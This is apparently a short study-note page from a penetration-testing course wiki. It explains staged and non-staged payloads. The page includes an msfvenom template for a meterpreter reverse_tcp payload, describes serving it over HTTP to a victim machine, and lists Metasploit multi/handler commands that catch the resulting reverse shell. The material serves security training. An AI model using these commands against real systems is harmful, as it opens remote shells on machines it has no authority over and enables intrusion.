---
title: "5 PAYLOAD STAGED Y NON STAGED"
category: ["S4VITAR", "fases", "Enumeracion de servicios", "CONCEPTOS DE ENUMERACION Y EXPLOTACION", "5-PAYLOAD STAGED Y NON-STAGED"]
---




**PAYLOAD STAGED**
It involves sending the payload in fragments  
	Advantages:  
			-Smaller, easier to transmit, and more stealthy (can be dynamically customized through tools like Metasploit)  

EXAMPLE with msfvenom:  

msfvenom -p Target_OS/version(e.g., windows x32 or x64)/meterpreter/reverse_tcp LHOST=(where you want the interactive console sent) LPORT=(LISTENING PORT) -f (payload format) -o (how we want it exported)  
![Pasted image 20251208183447](/VaultSite/wiki-images/Pasted%20image%2020251208183447.png)  
Now we would have the payload. This is done after exploiting a vulnerability, delivering the binary, and executing it.  

We will upload it from our machine using an HTTP server.  
If we search for the attacker's IP from the victim's machine, we'll see the payload:  
![Pasted image 20251208183732](/VaultSite/wiki-images/Pasted%20image%2020251208183732.png)  

Once the payload is on the victim's machine, we need to open Metasploit:  
![Pasted image 20251208183912](/VaultSite/wiki-images/Pasted%20image%2020251208183912.png)  
Now we enter:  
```
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_tcp  
show options  
set LHOST (our IP)  
set LPORT (our port)  
run  
```  
![Pasted image 20251208184159](/VaultSite/wiki-images/Pasted%20image%2020251208184159.png)  
For more information, we can use `help` to see everything we can do with Metasploit.  

**PAYLOAD NON-STAGED**  
Here, we try to send the payload all at once.  
	Advantages:  
		-It's sent in one go, making it faster. 



